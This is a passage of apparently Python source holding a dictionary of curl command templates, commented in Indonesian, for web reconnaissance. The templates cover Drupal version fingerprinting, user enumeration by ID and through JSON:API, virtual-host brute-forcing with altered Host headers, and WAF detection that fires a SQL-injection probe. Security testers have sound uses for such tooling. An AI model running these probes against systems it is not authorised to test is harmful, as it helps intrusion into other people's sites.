        "curl -s {url}/CHANGELOG.txt | head -3   # versi exact\n"
        "# User enum:\n"
        "for i in 1 2 3; do curl -s {url}/?q=user/$i | grep -oE '<h1[^>]*>[^<]+</h1>'; done\n"
        "# JSON:API:\n"
        "curl {url}/jsonapi/user/user"
    ),
    "vhost_brute": (
        "# Bandingkan response untuk Host header berbeda:\n"
        "curl -i -H 'Host: {host}' {url}\n"
        "curl -i -H 'Host: admin.{host}' {url}\n"
        "curl -i -H 'Host: dev.{host}' {url}\n"
        "curl -i -H 'Host: jenkins.{host}' {url}\n"
        "# Signature berbeda -> vhost ada di server tapi tidak di DNS publik."
    ),
    "waf_detect": (
        "curl -I {url}\n"
        "# Lihat header: cf-ray (Cloudflare), x-akamai-* (Akamai),\n"
        "#   x-sucuri-id, x-iinfo (Imperva), x-amz-cf-id (CloudFront).\n"
        "# Trigger WAF lalu lihat respons block-page:\n"
        "curl '{url}?id=1%27%20OR%201%3D1--'"
    ),
}
